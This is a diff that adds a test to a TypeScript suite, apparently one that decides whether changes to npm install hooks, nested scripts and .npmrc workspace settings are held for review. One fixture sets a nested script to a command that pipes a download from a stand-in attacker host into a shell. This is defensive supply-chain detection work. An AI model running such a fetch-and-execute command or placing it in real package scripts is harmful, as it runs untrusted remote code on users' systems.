@@ -350,3 +350,13 @@ describe("npm exec -p and NODE_ assignments", () => {
     expect(h("NODE_ENV=production npm run build")).toBe(false);
   });
 });
+
+describe("5c: a runner reached through a shell script", () => {
+  test("a root .npmrc added with a changed nested script holds; without a runner it does not", () => {
+    const hook = { postinstall: "sh scripts/install.sh", build: "echo ok" };
+    const oldF = (sh: string) => ({ "scripts/install.sh": sh, ...subManifest("echo a") });
+    const newF = (sh: string) => ({ "scripts/install.sh": sh, ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") });
+    expect(held(hook, oldF("npm run build\n"), newF("npm run build\n"))).toBe(true);
+    expect(held(hook, oldF("node setup.js\n"), newF("node setup.js\n"))).toBe(false);
+  });
+});
